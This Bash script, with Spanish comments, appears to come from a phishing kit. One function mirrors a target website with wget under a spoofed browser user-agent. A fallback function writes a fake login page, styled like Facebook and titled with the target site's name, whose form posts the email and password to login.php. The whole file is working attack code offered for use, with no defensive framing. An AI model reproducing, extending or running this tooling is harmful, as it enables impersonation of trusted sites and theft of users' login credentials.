#!/bin/bash

clonar_sitio() {
    local url=$1
    local sitio=$2
    local destino="sites/$sitio"
    
    echo -e "${C}[*]${W} Clonando $url ..."
    
    # Crear directorio
    mkdir -p "$destino"
    
    # Clonar con wget (modo recursivo, descarga todo)
    wget \
        --mirror \
        --convert-links \
        --adjust-extension \
        --page-requisites \
        --no-parent \
        --wait=1 \
        --limit-rate=100k \
        --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        --directory-prefix="$destino" \
        --no-host-directories \
        --cut-dirs=0 \
        "$url" 2>&1 | grep -E "Saving|ERROR" | sed 's/^/[wget] /'
    
    # Buscar el index.html principal
    find "$destino" -name "index.html" -type f | head -1 | xargs -I {} mv {} "$destino/index.html" 2>/dev/null
    
    # Verificar si se clonó bien
    if [ -f "$destino/index.html" ]; then
        echo -e "${G}[✔]${W} Sitio clonado correctamente en $destino"
    else
        echo -e "${R}[✘]${W} Error al clonar. Creando plantilla básica..."
        crear_plantilla_basica "$sitio"
    fi
}

crear_plantilla_basica() {
    local sitio=$1
    mkdir -p "sites/$sitio"
    
    cat > "sites/$sitio/index.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>${sitio^} - Iniciar Sesión</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 350px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; }
        h2 { text-align: center; color: #1877f2; }
    </style>
</head>
<body>
    <div class="container">
        <h2>${sitio^}</h2>
        <form method="POST" action="login.php">
            <input type="text" name="email" placeholder="Correo electrónico o teléfono" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>
EOF
    echo -e "${Y}[!]${W} Plantilla básica creada (el clonado real falló)"
}
